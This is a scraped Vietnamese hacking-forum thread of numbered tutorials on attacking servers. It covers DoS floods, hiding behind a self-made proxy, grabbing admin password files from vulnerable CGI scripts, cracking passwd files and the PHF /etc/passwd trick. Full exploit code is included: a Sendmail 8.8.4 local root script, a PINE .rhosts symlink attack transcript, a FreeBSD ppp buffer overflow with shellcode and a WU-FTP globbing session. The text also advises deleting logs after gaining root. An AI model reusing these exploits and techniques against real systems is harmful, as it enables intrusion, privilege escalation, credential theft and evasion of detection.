</blockquote><br/><br/><br/> _Nếu bạn từng qua lập trình khi đọc đoạn mã bạn sẽ thấy rằng đoạn mã này dùng chính thông tin từ ổ đĩa A của nạn nhân để tấn công nạn nhân . Nó sử dụng vòng lặp không có giới hạn từ hàm $socket "retr a:/x\r\n" . Khi muốn kết thúc bạn chỉ cần nhấn ctrl+C .<br/> _Cuối cùng là bạn chỉ cần gọi nó ra thông qua lệnh perl như các bài trên .VD :<br/><br/> perl abc.pl<span class="link"> http://www.xxx.com/</span> anonymous me<br/><br/> trong đó User name và Password có thể là bất kỳ .<br/><br/> Vậy là coi như các bạn đã biết tấn công DoS là như thế nào rồi phải không ? Đó chỉ là những cách tấn công DoS thông thường ( nhưng hậu quả thì chẳng thường thường chút nào ) , còn các kỹ thuật DoS lợi hại khác như DRDoS thì cho các bạn nghiên cứu thêm vậy . Nó rất nguy hiểm khi sử dụng lung tung nên để dành phần đó cho các bạn nào thích và thật sự muốn nghiên cứu về nó . Tôi xin dừng phần DoS tại đây .<br/><br/> <b>45 . ) Tự tạo cho mình một proxy để sài :</b><br/><br/> _Trong các công việc như tấn công DoS hay đột nhập vào trang Web có trang bị firewall thì bạn cần đến proxy để sài . Do đó các bạn hãy tự tạo cho mình một cái proxy made in &lt;yourname&gt; sài cho nó oai . Bây giờ hãy làm cùng tôi .<br/> _ Trước hết bạn đăng ký một host miễn phí ở trang free.prohosting.com . Bạn hãy khai báo thông tin về bạn trong các ô nhập thông tin . Cuối cùng khi đăng ký xong bạn sẽ nhận được Mail từ trang Web này gửi đến , hãy test nó để lấy pass mặc định mà nó cho bạn .<br/> _ Tiếp theo bạn vào trang www.xav.com , rồi nhấp vào link install phía dưới dòng chữ Test - script Package( tui nhớ là có 2 cái tên mang chữ script này ) . Sau đó bạn nhấn "next" và nhìn ở phía dưới của trang này có chữ show all verdon , bạn hãy nhấn vào đó .<br/> _ Tiếp tục bạn nhấn James Marshall ==&gt;CGIscript ==&gt;CGIproxy==&gt;Next==&gt;accept==&gt; cho đến khi bạn thấy một cái bảng có nhiều ô nhập thông tin . Bạn hãy nhập thông tin vào các trang đó :<br/> + your Website : nhập địa chỉ trang Web của bạn đã đăng ký trong prohosting.com .<br/> + FTP username : Bạn nhập username mà bạn đã đăng ký trong prohosting.com .<br/> + FTP password : Bạn nhập passwd mà prohosting.com đã send về mail cho bạn .<br/> + Mấy cái còn lại không cần thiết , bạn nhấp next để tiếp tục . Rồi nhấn finish .<br/> + Cuối cùng nó sẽ cho bạn địa chỉ bạn vừa tạo cái proxy đó , bạn hãy ghi nhớ nó . Sau này mỗi lần “hành động” thì bạn lại đem ra sài .<br/><br/> <b>46 . ) Kỹ thuật lấy pass thông qua lỗi của một số Script :</b><br/><br/> a . ) Calendar CGI Script :<br/><br/> _ Một trong số những scripts đã tìm thấy điểm yếu đó là calendar scripts , nó nằm trong thư mục cgi-bin/calendar, file config là file calendar.cfg chứa administrator username và password để thay đổi chọn lựa cho scripts khi cần , cái này có thể tìm thấy ở cuối file calendar.cfg , tuy nhiên chúng đã được mã hoá chúng ta chỉ việc dùng John The Ripper hay những công cụ khác để giải mã nó là xong :<br/> _file calendar.cfg thường đặt tại địa chỉ sau :<br/><br/><span class="link"> http://www.xxx.com/cgi-bin/calendar/calendar.cfg</span><br/><br/> sau khi crack xong chúng ta sẽ đến Admin Control Login vào địa chỉ :<br/><br/><span class="link"> http://www.xxx.com/cgi-bin/calen..._admin.pl?admin</span><br/><br/> _ Vậy là bạn đã có được quyền admin rồi đó .<br/><br/> b . ) WebBBS Script :<br/><br/> _WebAdverts Script là một scripts cho phép webmasters hiển thị những biểu ngữ luân phiên ( quảng cáo chẳng hạn ) hay thêm vào trong trang Web , cuối cùng bạn có thể sử dụng kết hợp password và username để cài đặt banners tạo một banner accounts mới , xoá accounts view sensitive info, vv.vv<br/> _Địa chỉ passwd của WebAdverts là :<br/><br/><span class="link"> http://www.xxx.com/cgi-bin/advert/adpassword.txt</span><br/><br/> sau khi giải mã bạn logging vào:<br/><br/><span class="link"> http://www.xxx.com/cgi-bin/advert/ads_admin.pl</span><br/><br/> để login như là script administrator .<br/><br/> c . ) WWWBoard Script :<br/><br/> _WWWBoard có file password có thể tìm thấy trong pasword.txt , chúng ta hãy search nó bằng từ khoá cgi-bin/wwwebboard hoặc webboard/password.txt .<br/><br/> d . ) Mailmachine Script :<br/><br/> _Mailmachine.cgi là một webbased mailinglist , bạn có thể trông thấy file adressed.txt chứa tất cả danh sách khách đã đăng ký , những danh sách có thể thấy tại những urls sau:<br/><br/><span class="link"> http://www.xxx.com/cgi-bin/mailman/addresses.txt</span><br/><span class="link"> http://www.xxx.com/cgi-bin/maillist/addresses.txt</span><br/><span class="link"> http://www.xxx.com/cgi-bin/mail/addresses.txt</span><br/><br/> bạn cũng nên tìm addresses.txt mà đôi khi chúng được đổi thành các tên khác . Chúng có thể chứa các thông tin quan trọng cho phép bạn khai thác .<br/><br/> Việc tìm ra các trang bị lỗi này hẳn các bạn đã biết , tôi sẽ không nhắc lại nữa ( Nếu ai chưa biết thì vui lòng đọc lạI những phần trước ) .<br/><br/> ======================================================<br/><br/> Nhân đây tôi xin đính chính lại là trong các đoạn code mà tôi phân tích và post lên ở những phần trước tôi đã sơ ý không thêm ký hiệu “#” vào trước những câu phân tích đó , dẫn đến việc một số bạn thắc mắc là đoạn code không hoạt động . Tôi thành thật xin lỗi các bạn vì sơ ý của tôi , các bạn chỉ cần lấy đoạn code đó ra và thêm vào dấu “ # ” ở phía trước dòng chú thích Tiếng Việt của tôi là được ( Thông thường tôi có sử dụng dấu “ &lt; == ” để giải thích ở phiá đuôi đoạn code đó . Các bạn hãy để ý mà fix nhé .<br/> Chúc vui vẻ .<br/><br/> GOOKLUCK!!!!!!!!!!!!<br/><br/> Hết phần 7 .<br/><br/> Bài viết của ANHDENDAY<br/> 111111111111111111111111111111111111111111111111111111<br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/131.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/131/521.html#521,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><br/> <font size='+3'><b>Phần 5</b></font><br/><br/> Lấy Password File bằng FTP<br/> (Đây là đồ cổ của HVA)<br/> Ok, cách dễ nhất để lấy superuser access là bằng anonymous ftp access vào trong trang web. Đầu tiên bạn cần biết một ít về password files...<br/><br/> <blockquote><br/> root:User:d7Bdg:1n2HG2:1127:20:Superuser<br/> TomJones:p5Y(h0tiC:1229:20:Tom Jones,:/usr/people/tomjones:/bin/csh<br/> BBob:EUyd5XAAtv2dA:1129:20:Billy Bob:/usr/people/bbob:/bin/csh<br/> &nbsp;
</blockquote><br/><br/><br/> Đây là 1 thí dụ của một password files mã hóa bình thường. Superuser là một trong những cách để vào root. Đây là phần chính của file:<br/><br/> <blockquote><br/> root<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:0:1:Superuser:/:<br/> ftp<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:202:102:Anonymous ftp:/u1/ftp:<br/> ftpadmin<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:203:102:ftp Administrator:/u1/ftp<br/> &nbsp;
</blockquote><br/><br/><br/> Đây là 1 thí dụ khác về password file, chỉ khác một chỗ, nó được shadowed (xin lỗi, không biết dịch làm sao ). Shadowed password files không cho xem hay copy file password được mã hóa. Nó gây khó khăn cho chương trình phá password và tạo dictionary. Đây là 1 thí dụ về shadowed password file:<br/><br/> <blockquote><br/> root<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:0:1:0000-Admin(0000):/:/usr/bin/csh<br/> daemon<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:1:1:0000-Admin(0000):/:<br/> bin<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:2:2:0000-Admin(0000):/usr/bin:<br/> sys<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:3:3:0000-Admin(0000):/:<br/> adm<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:4:4:0000-Admin(0000):/var/adm:<br/> lp<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:71:8:0000-lp(0000):/usr/spool/lp:<br/> smtp<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:0:0:mail daemon user:/:<br/> uucp<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:5:5:0000-uucp(0000):/usr/lib/uucp:<br/> nuucp<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:9:9:0000-uucp(0000):/var/spool/uucppublic:/usr/lib/uucp/uucico<br/> listen<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:37:4:Network Admin:/usr/net/nls:<br/> nobody<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:60001:60001:uid no body:/:<br/> noaccess<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:60002:60002:uid no access:/:<br/> webmastr<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:53:53:WWW Admin:/export/home/webmastr:/usr/bin/csh<br/> pin4geo<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:55:55<img src="/hvaonline/images/smilies/575eda61e93c7ad9d05928580213fd9b.gif" border="0" alt="smilie" align="absbottom">inPaper Admin:/export/home/webmastr/new/gregY/test/pin4geo:/bin/false<br/> ftp<img src="/hvaonline/images/smilies/40af9ca5d4af4f53bc05e0396f2436f0.gif" border="0" alt="smilie" align="absbottom">:54:54:Anonymous FTP:/export/home/anon_ftp:/bin/false<br/><br/> &nbsp;
</blockquote><br/><br/> Shadowed password files có chữ "x" trước password hoặc đôi khi là "*".<br/><br/> Bây giờ bạn đã biết nhiều hơn một chút về password file, bạn có thể định ra phần pw mã hóa bình thường từ shadowed pw file. Bây giờ chúng ta sẽ nói về bẻ nó.<br/><br/> Bẻ password cũng không quá phức tạp, mặc dù các files khác nhau đối với mỗi hệ thống.<br/> 1. Đầu tiên phải có password file bằng cách download hay copy nó.<br/> 2. Kế tiếp tìm chương trình crack password và chương trình tạo dictionary. Có thể nói gần như không thể tìm chương trình crack nhưng cũng có thể có vài cái tốt. Bạn nên dùng Cracker Jack, John the Ripper, Brute Force Cracker, hoặc Jack the Ripper. Bây giờ phải có chương trình tạo dictionary hoặc dictionary file... Khi chạy chương trình bẻ khóa sẽ hỏi bạn password file. Bạn dùng chương trình tạo dictionary để tạo. Bạn có thể tải ở hầu như tất cả các trang hacker. Chương trình tạo dictionary tất cả các cách có thể để ghép các ký tự do bạn chọn (ASCII, caps, lowercase, hoặc số).<br/> 3. Chạy chương trình crack, làm theo các hướng dẫn.<br/><br/><br/> Kỹ thuật PHF<br/><br/> Kỹ thuật PHF là cách dễ nhất để lấy password files (mặc dù không hoạt động trong hơn 95% trường hợp). Để thực hiện chỉ cần nhập vào browser:<br/> <blockquote><br/><span class="link"> http://webpage_goes_here/cgi-bin/phf?Qalia...t%20/etc/passwd</span><br/> &nbsp;
</blockquote><br/><br/> Thay thế webpage_goes_here với tên của trang. Thí dụ bạn muốn lấy pw file trong www.webpage.com thì bạn đánh:<br/> <blockquote><br/><span class="link"> http://www.webpage.com/cgi-bin/phf?Qalias=...t%20/etc/passwd</span><br/> &nbsp;
</blockquote><br/><br/> là xong! Chỉ việc ngồi chờ và copy (nếy nó hoạt động).<br/><br/><br/> Telnet và khai thác điểm yếu (exploits)<br/><br/> Tốt nhất là bạn nên có 1 account trên trang muốn tấn công (nếu có thể) và xem xét kỹ trang đó. Những lỗ hổng bảo mật hay lỗi trong hệ hống thường cho phép bạn xâm nhập vào root. Có nhiều lỗ hổng khác nhau và bạn có thể xét riêng lẻ chúng. Tôi liệt kê một số lỗ hổng.<br/><br/> Lỗ hổng này là Sendmail v.8.8.4<br/> Nó tạo một chương trình ở /tmp/x và có thể chạy như root. Đây là cách set up nó:<br/><br/> <blockquote><br/> cat &lt;&lt; _EOF_ &gt;/tmp/x.c<br/> #define RUN "/bin/ksh"<br/> #include&lt;stdio.h&gt;<br/> main()<br/> {<br/> execl(RUN,RUN,NULL);<br/> }<br/> _EOF_<br/> #<br/> cat &lt;&lt; _EOF_ &gt;/tmp/spawnfish.c<br/> main()<br/> {<br/> execl("/usr/lib/sendmail","/tmp/smtpd",0);<br/> }<br/> _EOF_<br/> #<br/> cat &lt;&lt; _EOF_ &gt;/tmp/smtpd.c<br/> main()<br/> {<br/> setuid(0); setgid(0);<br/> system("chown root /tmp/x ;chmod 4755 /tmp/x");<br/> }<br/> _EOF_<br/> #<br/> #<br/> gcc -O -o /tmp/x /tmp/x.c<br/> gcc -O3 -o /tmp/spawnfish /tmp/spawnfish.c<br/> gcc -O3 -o /tmp/smtpd /tmp/smtpd.c<br/> #<br/> /tmp/spawnfish<br/> kill -HUP `/usr/ucb/ps -ax|grep /tmp/smtpd|grep -v grep|sed s/"[ ]*"// |cut -d" " -f1`<br/> rm /tmp/spawnfish.c /tmp/spawnfish /tmp/smtpd.c /tmp/smtpd /tmp/x.c<br/> sleep 5<br/> if [ -u /tmp/x ] ; then<br/> echo "leet..."<br/> /tmp/x<br/> fi<br/> &nbsp;
</blockquote><br/><br/><br/> Và đây là một lỗ hổng khá. Tôi sẽ chỉ ra cách lợi dụng lỗ hổng PINE bằng Linux. Bằng cách xem process table bằng ps để biết user nào chạy PINE, sau đó thực hiện lệnh ls in /tmp/ để thu thập lockfile names cho mỗi user. Xem process table một lần nữa sẽ hiện ra mỗi user thoát PINE hoặc xem message trong INBOX.<br/><br/> Tạo link từ /tmp/.hamors_lockfile tới ~hamors/.rhosts sẽ làm cho PINE tạo ~hamors/.rhosts là file dạng 666 với nội dung là PINE's process id. Bây giờ có thể dùng lệnh echo "+ +" &gt; /tmp/.hamors_lockfile, sau đó rm /tmp/.hamors_lockfile.<br/><br/> Thí dụ, hamors là nạn nhân và catluvr tấn công:<br/><br/> [Quote ]<br/> hamors (21 19:04) litterbox:~&gt; pine<br/><br/> catluvr (6 19:06) litterbox:~&gt; ps -aux | grep pine<br/> catluvr 1739 0.0 1.8 100 356 pp3 S 19:07 0:00 grep pine<br/> hamors 1732 0.8 5.7 249 1104 pp2 S 19:05 0:00 pine<br/><br/> catluvr (7 19:07) litterbox:~&gt; ls -al /tmp/ | grep hamors<br/> - -rw-rw-rw- 1 hamors elite 4 Aug 26 19:05 .302.f5a4<br/><br/> catluvr (8 19:07) litterbox:~&gt; ps -aux | grep pine<br/> catluvr 1744 0.0 1.8 100 356 pp3 S 19:08 0:00 grep pine<br/><br/> catluvr (9 19:09) litterbox:~&gt; ln -s /home/hamors/.rhosts /tmp/.302.f5a4<br/><br/> hamors (23 19:09) litterbox:~&gt; pine<br/><br/> catluvr (11 19:10) litterbox:~&gt; ps -aux | grep pine<br/> catluvr 1759 0.0 1.8 100 356 pp3 S 19:11 0:00 grep pine<br/> hamors 1756 2.7 5.1 226 992 pp2 S 19:10 0:00 pine<br/><br/> catluvr (12 19:11) litterbox:~&gt; echo "+ +" &gt; /tmp/.302.f5a4<br/><br/> catluvr (13 19:12) litterbox:~&gt; cat /tmp/.302.f5a4<br/> + +<br/><br/> catluvr (14 19:12) litterbox:~&gt; rm /tmp/.302.f5a4<br/><br/> catluvr (15 19:14) litterbox:~&gt; rlogin litterbox.org -l hamors<br/><br/> &nbsp;
</blockquote><br/><br/> Tiếp theo là lỗ hổng của lỗi ppp. Lỗi này trên FreeBSD. Đây là cách set up nó:<br/><br/> [Quote ]<br/> #include &lt;stdio.h&gt;<br/> #include &lt;stdlib.h&gt;<br/> #include &lt;unistd.h&gt;<br/><br/> #define BUFFER_SIZE 156 /* size of the bufer to overflow */<br/><br/> #define OFFSET -290 /* number of bytes to jump after the start<br/> of the buffer */<br/><br/> long get_esp(void) { ("movl %esp,%eax\n"); }<br/><br/> main(int argc, char *argv[])<br/> {<br/> char *buf = NULL;<br/> unsigned long *addr_ptr = NULL;<br/> char *ptr = NULL;<br/> char execshell[] =<br/> "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f" /* 16 bytes */<br/> "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52" /* 16 bytes */<br/> "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01" /* 20 bytes */<br/> "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04"; /* 15 bytes, 57 total */<br/><br/> int i,j;<br/><br/> buf = malloc(4096);<br/><br/> /* fill start of bufer with nops */<br/><br/> i = BUFFER_SIZE-strlen(execshell);<br/><br/> memset(buf, 0x90, i);<br/> ptr = buf + i;<br/><br/> /* place exploit code into the buffer */<br/><br/> for(i = 0; i &lt; strlen(execshell); i++)<br/> *ptr++ = execshell;<br/><br/> addr_ptr = (long *)ptr;<br/> for(i=0;i &lt; (104/4); i++)<br/> *addr_ptr++ = get_esp() + OFFSET;<br/><br/> ptr = (char *)addr_ptr;<br/> *ptr = 0;<br/><br/> setenv("HOME", buf, 1);<br/><br/> execl("/usr/sbin/ppp", "ppp", NULL);<br/> }<br/> &nbsp;
</blockquote><br/><br/><br/> Bây giờ bạn đã vào được root. "What's next?" Tùy bạn nhưng tôi muốn khuyên bạn nên đổi password trước khi xóa hay thay đổi các thứ. Để thay đổi password bạn phải login bằng telnet và login với account mới. Sau đó chỉ cần đánh: <i>passwd nó sẽ hỏi pw cũ và pw mới. Bây giờ chỉ có bạn mới có pw và nó có thể kéo dài thời gian bạn upload, delete logs file và làm những gì bạn muốn.<br/><br/><br/> [i]<b>Rất cảm ơn sự ủng hộ của các bạn , và đây là phần 5 </b></i><br/><br/> <b>31 . ) Gói tin TCP/IP là gì?</b><br/><br/> TCP/IP viết tắt cho Transmission Control Protocol and Internet Protocol, một Gói tin TCP/IP là một khối dữ liệu đã được nén, sau đó kèm thêm một header và gửi đến một máy tính khác. Đây là cách thức truyền tin của internet, bằng cách gửi các gói tin. Phần header trong một gói tin chứa địa chỉ IP của người gửi gói tin. Bạn có thể viết lại một gói tin và làm cho nó trong giống như đến từ một người khác!! Bạn có thể dùng cách này để tìm cách truy nhập vào rất nhiều hệ thống mà không bị bắt. Bạn sẽ phải chạy trên Linux hoặc có một chương trình cho phép bạn làm điều này.<br/><br/> <b>32 . ) Linux là gi`: </b><br/><br/> _Nói theo nghĩa gốc, Linux là nhân ( kernel ) của HĐH. Nhân là 1 phần mềm đảm trách chức vụ liên lạc giữa các chương trình ứng dụng máy tính và phần cứng. Cung cấp các chứng năng như: quản lý file, quản lý bộ nhớ ảo, các thiết bị nhập xuất nhưng ổ cứng, màn hình, bàn phím, .... Nhưng Nhân Linux chưa phải là 1 HĐH, vì thế nên Nhân Linux cần phải liên kết với những chương trình ứng dụng được viết bởi tổ chức GNU tạo lên 1 HĐH hoàn chỉnh: HĐH Linux. Đây cũng là lý do tại sao chúng ta thấy GNU/Linux khi được nhắc đến Linux.<br/> Tiếp theo, 1 công ty hay 1 tổ chức đứng ra đóng gói các sản phẩm này ( Nhân và Chương trình ứng dụng ) sau đó sửa chữa một số cấu hình để mang đặc trưng của công ty/ tổ chức mình và làm thêm phần cài đặt ( Installation Process ) cho bộ Linux đó, chúng ta có : Distribution. Các Distribution khác nhau ở số lượng và loại Software được đóng gói cũng như quá trình cài đặt, và các phiên bản của Nhân. 1 số Distribution lớn hiện nay của Linux là : Debian, Redhat, Mandrake, SlackWare, Suse .<br/><br/> <b>33 . ) Các lệnh căn bản cần biết khi sử dụng hoặc xâm nhập vào hệ thống Linux :</b><br/><br/> _ Lệnh " man" : Khi bạn muốn biết cách sử dụng lệnh nào thì có thể dùng tới lệnh nay :<br/> Cấu trúc lệnh : $ man .<br/> Ví dụ : $ man man<br/> _ Lệnh " uname ": cho ta biết các thông tin cơ bản về hệ thống<br/> Ví dụ : $uname -a ; nó sẽ đưa ra thông tin sau :<br/><br/> Linux gamma 2.4.18 #3 Wed Dec 26 10:50:09 ICT 2001 i686 unknown<br/><br/> _ Lệnh id : xem uid/gid hiện tại ( xem nhóm và tên hiện tại )<br/><br/> _ Lệnh w : xem các user đang login và action của họ trên hệ thống .<br/> Ví Dụ : $w nó sẽ đưa ra thông tin sau :<br/><br/> 10:31pm up 25 days, 4:07, 18 users, load average: 0.06, 0.01, 0.00<br/><br/> _ Lệnh ps: xem thông tin các process trên hệ thống<br/> Ví dụ : $ps axuw<br/> _ Lệnh cd : bạn muốn di chuyển đến thư mục nào . phải nhờ đến lệnh này .<br/> Ví du : $ cd /usr/bin ----&gt; nó sẽ đưa bạn đến thư mục bin<br/> _ Lệnh mkdir : tạo 1 thư mục .<br/> Ví dụ : $ mkdir /home/convit ---&gt; nó sẽ tạo 1 thư mục convit trong /home<br/> _ Lệnh rmdir : gỡ bỏ thư mục<br/> Ví dụ : $ rmdir /home/conga ----&gt; nó sẽ gỡ bỏ thư mục conga trong /home .<br/> _ Lệnh ls: liệt kê nội dung thư mục<br/> Ví dụ : $ls -laR /<br/> _ Lệnh printf: in dữ liệu có định dạng, giống như sử dựng printf() của C++ .<br/> Ví dụ : $printf %s "\x41\x41\x41\x41"<br/> _ Lệnh pwd: đưa ra thư mục hiện hành<br/> Ví dụ : $pwd ------&gt; nó sẽ cho ta biết vị trí hiện thời của ta ở đâu : /home/level1<br/> _ Các lệnh : cp, mv, rm có nghĩa là : copy, move, delete file<br/> Ví dụ với lệnh rm (del) : $rm -rf /var/tmp/blah -----&gt;nó sẽ del file blah .<br/> Làm tương tự đối với các lệnh cp , mv .<br/> _ Lệnh find : tìm kiếm file, thư mục<br/> Ví dụ : $find / -user level2<br/> _ Lệnh grep: công cụ tìm kiếm, cách sử dụng đơn giản nhất : grep "something"<br/> Vidu : $ps axuw | grep "level1"<br/> _ Lệnh Strings: in ra tất cả các ký tự in được trong 1 file. Dùng nó để tìm các khai báo hành chuỗi trong chương trình, hay các gọi hàm hệ thống, có khi tìm thấy cả password nữa<br/> VD: $strings /usr/bin/level1<br/> _ Lệnh strace: (linux) trace các gọi hàm hệ thống và signal, cực kỳ hữu ích để theo dõi flow của chương trình, cách nhanh nhất để xác định chương trình bị lỗi ở đoạn nào. Trên các hệ thống unix khác, tool tương đương là truss, ktrace .<br/> Ví dụ : $strace /usr/bin/level1<br/> _ Lệnh" cat, more ": in nội dung file ra màn hình<br/><br/> $cat /etc/passwd | more --&gt; nó sẽ đưa ra nội dung file passwd một cách nhanh nhất .<br/> $more /etc/passwd ----&gt; Nó sẽ đưa ra nội dung file passwd một cách từ từ .<br/><br/> _ Lệnh hexdump : in ra các giá trị tương ứng theo ascii, hex, octal, decimal của dữ liệu nhập vào .<br/> Ví dụ : $echo AAAA | hexdump<br/> _ Lệnh : cc, gcc, make, gdb: các công cụ biên dịch và debug .<br/> Ví dụ : $gcc -o -g bof bof.c<br/> Ví dụ : $make bof<br/> Ví dụ : $gdb level1<br/> (gdb) break main<br/> (gdb) run<br/> _ Lệnh perl: một ngôn ngữ<br/> Ví dụ : $perl -e 'print "A"x1024' | ./bufferoverflow ( Lỗi tràn bộ đệm khi ta đánh vào 1024 kí tự )<br/> _ Lệnh "bash" : đã đến lúc tự động hoá các tác vụ của bạn bằng shell script, cực mạnh và linh hoạt .<br/> Bạn muốn tìm hiểu về bash , xem nó như thế nào :<br/> $man bash<br/> _ Lệnh ls : Xem nội dung thư mục ( Liệt kê file trong thư mục ) .<br/> Ví Dụ : $ ls /home ----&gt; sẽ hiện toàn bộ file trong thư mục Home<br/> $ ls -a -----&gt; hiện toàn bộ file , bao gồm cả file ẩn<br/> $ ls -l -----&gt; đưa ra thông tin về các file<br/> _ Lệnh ghi dữ liệu đầu ra vào 1 file :<br/> Vídụ : $ ls /urs/bin &gt; ~/convoi ------&gt; ghi dữ liệu hiển thị thông tin của thư mục bin vào 1 file convoi .<br/><br/> <b>34 . ) Những hiểu biết cơ bản xung quanh Linux :</b><br/><br/> a . ) Một vài thư mục quan trọng trên server :<br/><br/> _ /home : nơi lưu giữ các file người sử dụng ( VD : người đăng nhập hệ thống có tên là convit thì sẽ có 1 thư mục là /home/convit )<br/> _ /bin : Nơi xử lý các lệnh Unix cơ bản cần thiết như ls chẳng hạn .<br/> _ /usr/bin : Nơi xử lý các lệnh dặc biệt khác , các lệnh dùng bởi người sử dụng đặc biệt và dùng quản trị hệ thống .<br/> _ /bot : Nơi mà kernel và các file khác được dùng khi khởi động .<br/> _ /ect : Các file hoạt động phụ mạng , NFS (Network File System ) Thư tín ( Đây là nơi trọng yếu mà chúng ta cần khai thác nhiều nhất )<br/> _ /var : Các file quản trị<br/> _ /usr/lib : Các thư viện chuẩn như libc.a<br/> _ /usr/src : Vị trí nguồn của các chương trình .<br/><br/> b . ) Vị trí file chứa passwd của một số phiên bản khác nhau :<br/><br/><br/> <blockquote>CODE<br/> AIX 3 /etc/security/passwd !/tcb/auth/files//<br/> A/UX 3.0s /tcb/files/auth/?/*<br/> BSD4.3-Ren /etc/master.passwd *<br/> ConvexOS 10 /etc/shadpw *<br/> ConvexOS 11 /etc/shadow *<br/> DG/UX /etc/tcb/aa/user/ *<br/> EP/IX /etc/shadow x<br/> HP-UX /.secure/etc/passwd *<br/> IRIX 5 /etc/shadow x<br/> Linux 1.1 /etc/shadow *<br/> OSF/1 /etc/passwd[.dir|.pag] *<br/> SCO Unix #.2.x /tcb/auth/files//<br/> SunOS4.1+c2 /etc/security/passwd.adjunct ##username<br/> SunOS 5.0 /etc/shadow<br/> System V Release 4.0 /etc/shadow x<br/> System V Release 4.2 /etc/security/* database<br/> Ultrix 4 /etc/auth[.dir|.pag] *<br/> UNICOS /etc/udb *&nbsp;
</blockquote><br/><br/><br/> <b>35 . ) Khai thác lỗi của Linux qua lỗ hổng bảo mật của WU-FTP server :</b><br/><br/> _ WU-FTP Server (được phát triển bởi đại Học Washington ) là một phần mềm Server phục vụ FTP được dùng khá phổ biến trên các hệ thống Unix & Linux ( tất cả các nhà phân phối: Redhat, Caldera, Slackware, Suse, Mandrake....) và cả Windows.... , các hacker có thể thực thi các câu lệnh của mình từ xa thông qua file globbing bằng cách ghi đè lên file có trên hệ thống .<br/> _ Tuy nhiên , việc khai thác lỗi này không phảI là dễ vì nó phải hội đủ những điều kiện sau :<br/> + Phải có account trên server .<br/> + Phải đặt được Shellcode vào trong bộ nhớ Process của Server .<br/> + Phải gửi một lệnh FTP đặc biệt chứa đựng một globbing mẫu đặc biệt mà không bị server phát hiện có lỗi .<br/> + Hacker sẽ ghi đè lên một Function, Code tới một Shellcode, có thể nó sẽ được thực thi bới chính Server FTP .<br/> _ Ta hãy phân tích VD sau về việc ghi đè lên file của server FTP :<br/><br/><br/> CODE<br/> ftp&gt; open localhost &lt;== lệnh mở trang bị lỗi .<br/> Connected to localhost (127.0.0.1).<br/> 220 sasha FTP server (Version wu-2.6.1-18) ready &lt;== xâm nhập thành công FTP server .<br/> Name (localhost:root): anonymous &lt;== Nhập tên chỗ này<br/> 331 Guest login ok, send your complete e-mail address as password.<br/> Password:………..&lt;== nhập mật khẩu ở đây<br/> 230 Guest login ok, access restrictions apply.<br/> Remote system type is UNIX.<br/> Using binary mode to transfer files. &lt;== sử dụng biến nhị phân để chuyển đổi file .<br/> ftp&gt; ls ~{ &lt;== lệnh liệt kê thư mục hiện hành .<br/> 227 Entering Passive Mode (127,0,0,1,241,205)<br/> 421 Service not available, remote server has closed connection<br/> 1405 ? S 0:00 ftpd: accepting connections on port 21 ç chấp nhận kết nốI ở cổng 21 .<br/> 7611 tty3 S 1:29 gdb /usr/sbin/wu.ftpd<br/> 26256 ? S 0:00 ftpd:<br/> sasha:anonymous/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br/> 26265 tty3 R 0:00 bash -c ps ax | grep ftpd<br/> (gdb) at 26256<br/> Attaching to program: /usr/sbin/wu.ftpd, process 26256 &lt;== khai thác lỗi Wu.ftpd .<br/> Symbols already loaded for /lib/libcrypt.so.1<br/> Symbols already loaded for /lib/libnsl.so.1<br/> Symbols already loaded for /lib/libresolv.so.2